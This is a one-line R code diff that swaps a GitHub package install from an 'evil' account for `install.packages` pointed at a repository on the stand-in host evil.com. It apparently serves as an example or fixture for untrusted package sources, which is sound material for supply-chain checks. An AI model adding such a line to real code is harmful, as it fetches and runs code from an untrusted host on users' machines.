@@ -1,1 +1,1 @@
-remotes::install_github("evil/pkg")
+utils::install.packages("foo", repos = "https://evil.com/cran")
